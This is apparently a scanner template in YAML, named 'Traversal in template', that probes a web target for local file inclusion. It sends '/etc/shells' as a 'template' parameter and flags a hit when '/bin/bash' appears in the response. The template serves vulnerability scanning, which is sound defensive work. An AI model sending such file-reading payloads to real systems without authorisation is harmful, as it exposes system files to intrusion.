id: lfi6-1055
name: 'Traversal in template'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via template'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - '/etc/shells'
    matchers:
      - type: word
        part: body
        words:
          - '/bin/bash'
